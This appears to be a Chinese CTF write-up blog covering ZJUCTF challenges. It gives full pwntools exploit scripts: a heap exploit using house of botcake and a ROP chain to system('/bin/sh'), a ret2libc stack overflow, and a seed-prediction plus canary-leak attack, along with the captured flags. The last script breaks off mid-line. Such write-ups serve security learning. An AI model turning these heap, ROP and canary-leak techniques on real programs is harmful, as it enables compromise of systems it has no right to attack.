<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="小A口算"><a href="#小A口算" class="headerlink" title="小A口算"></a>小A口算</h3><p>该题目会随机生成20以内的数字比较，可以构造脚本在1分钟内刷够足够分数，从而获取flag</p>
<p><code>exp</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./arithmetic&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">38981</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Input your choice:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Try your best to answer questions as much as possible!\n&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">150</span>):</span><br><span class="line">    p.recvline()</span><br><span class="line">    challenge = (p.recvline()).decode(encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    v1 = challenge.split(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">    v1[<span class="number">0</span>] = <span class="built_in">int</span>(v1[<span class="number">0</span>])</span><br><span class="line">    v1[<span class="number">1</span>] = <span class="built_in">int</span>(v1[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    info(v1)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> v1[<span class="number">0</span>] == v1[<span class="number">1</span>]:</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;input &#x27;&gt;&#x27;, &#x27;&lt;&#x27; or &#x27;=&#x27; :&quot;</span>, <span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> v1[<span class="number">0</span>] &gt; v1[<span class="number">1</span>]:</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;input &#x27;&gt;&#x27;, &#x27;&lt;&#x27; or &#x27;=&#x27; :&quot;</span>, <span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;input &#x27;&gt;&#x27;, &#x27;&lt;&#x27; or &#x27;=&#x27; :&quot;</span>, <span class="string">&#x27;&lt;&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Correct! Your score is&quot;</span>)</span><br><span class="line">    p.recvline()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>成功获取flag: <code>ZJUCTF&#123;WoW_K1n6_0F_5h0-g4Ku-s31_4r1thm3t1c&#125;</code></p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="cake-bot"><a href="#cake-bot" class="headerlink" title="cake_bot"></a>cake_bot</h3><p>保护全开，libc版本2.34<br>其中保存了两个列表（或者说一个结构体列表），列表长度限制为16</p>
<ul>
<li><code>cake_list</code>: 保存malloc的cake地址</li>
<li><code>cake_size_list</code>: 保存cake的size</li>
</ul>
<p>其中定义了Add，Show, Delete函数</p>
<ul>
<li>Add函数：申请新的cake，可以选择存放在列表的index，申请前检查index是否超过16，或者申请size是否不为0；然后定义cakesize，malloc对应大小的cake，然后读取对应大小的输入。</li>
<li>Show函数：检查对应index的cake内容；</li>
<li>Delete函数：释放对应的index的cake，这里没有将cake_list对应index堆地址置0，而且将size置0，因此可以delete后add该index。之后就可以泄露libc等内容。</li>
</ul>
<p><strong>思路</strong>：通过unsortedbin attack泄漏libc地址，也可以通过tcachebin泄露heap地址，还可以通过house of botcake获取栈environ地址。接下来就是通过house of botcake构造rop写入栈返回地址了</p>
<p><code>exp</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size, payload</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Choose a box to pack the cake:\n&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input size of shipping address:\n&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input your address:\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input index of box to check:\n&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input index of box to send:\n&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./cakebot&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">44907</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p, &quot;b *$rebase(0x0000000000001346)&quot;)</span></span><br><span class="line"><span class="comment"># chunk0 index0</span></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk0 index0</span></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk1 index1</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x20</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x200</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;This box will be sent to:\n\x00&quot;</span>)</span><br><span class="line">libc_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x203d0a</span></span><br><span class="line">info(<span class="string">f&#x27;libc_addr: <span class="subst">&#123;<span class="built_in">hex</span>(libc_addr)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">0x110</span>-<span class="number">6</span>)</span><br><span class="line">heap_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) * <span class="number">0x1000</span></span><br><span class="line">info(<span class="string">f&#x27;heap_addr: <span class="subst">&#123;<span class="built_in">hex</span>(heap_addr)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">environ_addr = (libc_addr + <span class="number">0x20ad58</span> - <span class="number">0x38</span>) ^ (heap_addr // <span class="number">0x1000</span>)</span><br><span class="line">info(<span class="string">f&#x27;environ_addr: <span class="subst">&#123;<span class="built_in">hex</span>(environ_addr)&#125;</span>&#x27;</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment"># house of botcake tcache attack to leak stack_addr</span></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x20</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x200</span>, flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>, <span class="number">0x110</span>, <span class="number">0x110</span>, environ_addr))</span><br><span class="line">add(<span class="number">15</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">14</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">show(<span class="number">14</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;This box will be sent to:\n\x00&quot;</span>)</span><br><span class="line">p.recv(<span class="number">0x38</span>)</span><br><span class="line"></span><br><span class="line">stack_addr = (u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x28</span>-<span class="number">0x120</span>) ^ (heap_addr // <span class="number">0x1000</span> + <span class="number">1</span>)</span><br><span class="line">info(<span class="string">f&quot;stack_addr: <span class="subst">&#123;<span class="built_in">hex</span>(stack_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># house of botcake to modify rbp+8</span></span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x30</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line"><span class="comment"># add(6, 0x100, flat(b&#x27;&#x27;))</span></span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x200</span>, flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>, <span class="number">0x110</span>, <span class="number">0x110</span>, stack_addr))</span><br><span class="line">pause()</span><br><span class="line">add(<span class="number">12</span>, <span class="number">0x200</span>, flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>, <span class="number">0x110</span>, <span class="number">0x110</span>, stack_addr))</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">pop_rdi_rbp = <span class="number">0x000000000002a873</span>+libc_addr</span><br><span class="line">bin_sh_addr = <span class="number">0x00000000001cb42f</span>+libc_addr</span><br><span class="line">system_addr = libc.sym[<span class="string">&#x27;system&#x27;</span>]+libc_addr</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="number">0</span>, pop_rdi_rbp, bin_sh_addr, <span class="number">0</span>, system_addr)</span><br><span class="line">add(<span class="number">13</span>, <span class="number">0x100</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>获取到flag: <code>ZJUCTF&#123;C4ke_8ot?_8otC4ke!&#125;</code></p>
<h4 id="easy-rop"><a href="#easy-rop" class="headerlink" title="easy rop"></a>easy rop</h4><p>存在栈溢出，通过泄漏libc和程序基址后获取shell。中间返回到main函数时需要考虑栈平衡，不过由于payload长度不够，所以最后将返回地址改为start函数，得解。</p>
<p><code>exp</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./rop&#x27;)</span></span><br><span class="line"><span class="comment"># gdb.attach(p, &quot;b *$rebase(0x00000000000008A9)&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">46799</span>)</span><br><span class="line"><span class="comment"># ret2libc</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">read_addr = <span class="number">0x00000000000007da</span></span><br><span class="line">main_addr = <span class="number">0x00000000000008AB</span></span><br><span class="line">start_addr = <span class="number">0x00000000000006D0</span></span><br><span class="line"><span class="comment"># read_addr = int(input(), 16)</span></span><br><span class="line"><span class="comment"># 可以通过printf泄漏基址</span></span><br><span class="line">payload = flat(<span class="string">&#x27;SJTU&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">4</span>), <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>, p16(start_addr))</span><br><span class="line">p.sendafter(<span class="string">&#x27;Print Your name please: &#x27;</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">base_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x6d0</span></span><br><span class="line">info(<span class="string">f&#x27;base_addr: <span class="subst">&#123;<span class="built_in">hex</span>(base_addr)&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="keyword">assert</span> base_addr &gt;= <span class="number">0x1000000</span></span><br><span class="line"><span class="comment"># 泄漏libc</span></span><br><span class="line">pop_rdi = <span class="number">0x963</span>+base_addr</span><br><span class="line">read_addr = <span class="number">0x7da</span>+base_addr</span><br><span class="line">start_addr += base_addr</span><br><span class="line">printf_got += base_addr</span><br><span class="line">printf_plt += base_addr</span><br><span class="line">ret_addr = <span class="number">0x8fb</span>+base_addr</span><br><span class="line">payload = flat(<span class="string">&quot;SJTU&quot;</span>, <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">4</span>), <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>, pop_rdi, printf_got, ret_addr, printf_plt, start_addr)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;Print Your name please: &#x27;</span>, payload)</span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">printf_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="string">f&#x27;printf_addr: <span class="subst">&#123;<span class="built_in">hex</span>(printf_addr)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc_addr = printf_addr-(0x7fb0075b7e80- 0x7fb007553000)</span></span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;printf&quot;</span>, printf_addr)</span><br><span class="line">libc_addr = printf_addr-<span class="number">0x64e40</span></span><br><span class="line">info(<span class="string">f&#x27;libc_addr: <span class="subst">&#123;<span class="built_in">hex</span>(libc_addr)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造system()</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc-2.27.so&#x27;)</span></span><br><span class="line">system_addr = <span class="number">0x4f420</span> + libc_addr</span><br><span class="line">bin_sh_addr = <span class="number">0x1b3d88</span> + libc_addr</span><br><span class="line"><span class="comment"># system_addr = libc_addr+libc.dump(&quot;system&quot;)</span></span><br><span class="line"><span class="comment"># bin_sh_addr = libc_addr+libc.dump(&quot;str_bin_sh&quot;)</span></span><br><span class="line">payload = flat(<span class="string">&quot;SJTU&quot;</span>, <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">4</span>), <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>, pop_rdi, bin_sh_addr, ret_addr, system_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Print Your name please: &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>得到flag: <code>ZJUCTF&#123;@n_1a$y_R0p_cHalL_1N_x64|A7hdJk5wN7&#125;</code></p>
<h3 id="大-A-口算"><a href="#大-A-口算" class="headerlink" title="大 A 口算"></a>大 A 口算</h3><p>首先通过已知种子为2010年的同一时间，可以预测出所有题目。</p>
<p>漏洞点</p>
<img src="/posts/dc126860/image-20241022210822484.png" class="" title="image-20241022210822484">

<p>通过每次写满s变量，可以每次增加1字节，从而达到泄漏canary，partial write跳转到打印flag的函数即可。</p>
<p><code>exp</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取当前时间</span></span><br><span class="line">current_time = datetime.now()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印当前时间及时间戳</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;当前时间:&quot;</span>, current_time)</span><br><span class="line">current_timestamp = <span class="built_in">int</span>(time.mktime(current_time.timetuple()))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;当前时间戳:&quot;</span>, current_timestamp)</span><br><span class="line"><span class="comment"># 修改年份为 2010 年</span></span><br><span class="line">modified_time = current_time.replace(year=<span class="number">2010</span>)</span><br><span class="line"><span class="comment"># 获取修改后年份的时间戳</span></span><br><span class="line">timestamp = <span class="built_in">int</span>(time.mktime(modified_time.timetuple()))</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">38911</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./arithmetic&#x27;)</span></span><br><span class="line"><span class="comment"># gdb.attach(p, &#x27;b *$rebase(0x0000000000001B36)&#x27;)</span></span><br><span class="line">seed = timestamp</span><br><span class="line"><span class="comment"># seed = current_timestamp</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Input your choice:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment"># 推测出正确的timestamp</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># guess = random.randint(0, 2)</span></span><br><span class="line">guess = <span class="number">0</span></span><br><span class="line">info(<span class="string">f&quot;guess: <span class="subst">&#123;guess&#125;</span>&quot;</span>)</span><br><span class="line">info(<span class="string">f&quot;seed+guess: <span class="subst">&#123;seed+guess&#125;</span>&quot;</span>)</span><br><span class="line">seed_correct = <span class="literal">False</span></span><br><span class="line">libc.srand(seed+guess)</span><br><span class="line"><span class="comment"># 生成一个随机数（类似rand()）</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_challenge</span>():</span><br><span class="line">    v1 = libc.rand() % <span class="number">20</span> + <span class="number">1</span>  <span class="comment"># C的rand()通常生成0到RAND_MAX之间的值，RAND_MAX = 2^31-1</span></span><br><span class="line">    v2 = libc.rand() % <span class="number">20</span> + <span class="number">1</span></span><br><span class="line">    <span class="comment"># info(f&quot;question:\t &#123;v1&#125; ? &#123;v2&#125; &quot;)</span></span><br><span class="line">    <span class="keyword">return</span> v1, v2</span><br><span class="line"></span><br><span class="line">answer = <span class="string">&#x27;&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;\nNow guess the answer, I&#x27;ll correct your answer:&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    v1 = [<span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">    v1[<span class="number">0</span>], v1[<span class="number">1</span>] = generate_challenge()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> v1[<span class="number">0</span>] == v1[<span class="number">1</span>]:</span><br><span class="line">        answer += <span class="string">&#x27;=&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> v1[<span class="number">0</span>] &gt; v1[<span class="number">1</span>]:</span><br><span class="line">        answer += <span class="string">&#x27;&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        answer += <span class="string">&#x27;&lt;&#x27;</span></span><br><span class="line">info(<span class="string">f&#x27;answer: <span class="subst">&#123;answer&#125;</span>&#x27;</span>)</span><br><span class="line">p.send(answer)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\nchecking answers...\n&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\nOK! &quot;</span>)</span><br><span class="line">score = <span class="built_in">int</span>(p.recv(<span class="number">3</span>).decode(encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">info(score)</span><br><span class="line"><span class="keyword">if</span> score == <span class="number">256</span>:</span><br><span class="line">    seed_correct = <span class="literal">True</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;guess in not correct&quot;</span>)</span><br><span class="line"></span><br><span class="line">answer = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    v1[<span class="number">0</span>], v1[<span class="number">1</span>] = generate_challenge()</span><br><span class="line">    <span class="keyword">if</span> v1[<span class="number">0</span>] == v1[<span class="number">1</span>]:</span><br><span class="line">        answer += <span class="string">&#x27;=&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> v1[<span class="number">0</span>] &gt; v1[<span class="number">1</span>]:</span><br><span class="line">        answer += <span class="string">&#x27;&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        answer += <span class="string">&#x27;&lt;&#x27;</span></span><br><span class="line">info(<span class="string">f&quot;answer: <span class="subst">&#123;answer&#125;</span>&quot;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;Now guess the answer, I&#x27;ll correct your answer:&quot;</span>, answer)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\nchecking answers...\n&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\nOK! &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># step 3: 增加size值 256-&gt;257</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    answer = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">257</span>+j):</span><br><span class="line">        v1[<span class="number">0</span>], v1[<span class="number">1</span>] = generate_challenge()</span><br><span class="line">        <span class="keyword">if</span> v1[<span class="number">0</span>] == v1[<span class="number">1</span>]:</span><br><span class="line">            answer += <span class="string">&#x27;=&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> v1[<span class="number">0</span>] &gt; v1[<span class="number">1</span>]:</span><br><span class="line">            answer += <span class="string">&#x27;&gt;&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            answer += <span 